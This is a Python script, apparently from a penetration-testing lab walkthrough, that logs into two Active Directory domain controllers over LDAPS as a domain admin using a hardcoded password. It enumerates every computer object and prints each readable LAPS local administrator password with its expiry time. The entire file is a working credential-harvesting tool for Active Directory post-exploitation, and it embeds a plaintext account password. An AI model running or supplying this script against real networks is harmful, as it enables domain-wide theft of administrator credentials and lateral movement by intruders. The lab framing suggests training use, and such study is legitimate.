# WT100 - LAPS Bulk Extraction (DA) - ws01 native
# Chain: LDAPS bind as chief_command (DA+EA) -> enumerate computer objects across
#        child.cadre.local (mbr01) + cadre.local -> read ms-Mcs-AdmPwd (legacy
#        LAPS) / msLAPS-Password (Windows LAPS) + expiration.
# Validation scope: extract the LAPS passwords domain-wide (process + artifacts).
# The password USE (local admin login) is the user's practice step.
import sys
from ldap3 import Server, Connection, NTLM, ALL

servers = [
    ('CHILD', '192.168.77.11', 'DC=child,DC=cadre,DC=local'),   # dc02
    ('ROOT',  '192.168.77.10', 'DC=cadre,DC=local'),            # dc01
]
attrs = ['*']  # scan returned attrs for LAPS fields (child schema may lack ms-Mcs-AdmPwd)
LAPS_PW_ATTRS = ('ms-mcs-admpwd', 'mslaps-password')

for label, ip, base in servers:
    print('=== %s (%s) ===' % (label, ip))
    try:
        server = Server(ip, port=636, use_ssl=True, get_info=ALL)
        conn = Connection(server, user='cadre.local\\chief_command',
                          password='C0mm@nd_Ch1ef!', authentication=NTLM, auto_bind=True)
        print('LDAPS_BIND_OK', label)
    except Exception as e:
        print('BIND_FAIL', label, e)
        continue
    conn.search(base, '(objectClass=computer)', attributes=attrs, paged_size=500)
    found = 0
    for e in conn.entries:
        name = e['name'].value if 'name' in e.entry_attributes else '?'
        pw = None
        for a in e.entry_attributes:
            if a.lower() in LAPS_PW_ATTRS:
                v = e[a].value
                if v:
                    pw = (a, v)
                    break
        if pw:
            found += 1
            exp = ''
            for ea in e.entry_attributes:
                if ea.lower() in ('ms-mcs-admpwdexpirationtime', 'mslaps-passwordexpirationtime'):
                    exp = str(e[ea].value)
                    break
            print('LAPS_COMPUTER %s ATTR %s PASSWORD %s EXP %s' % (name, pw[0], pw[1], exp))
    schema_attrs = set()
    for e in conn.entries:
        for a in e.entry_attributes:
            if 'laps' in a.lower() or 'admpwd' in a.lower():
                schema_attrs.add(a)
    print('LAPS_ATTRS_PRESENT %s %s' % (label, sorted(schema_attrs)))
    print('LAPS_READABLE %s %d' % (label, found))
    conn.unbind()
print('WT100_DONE')
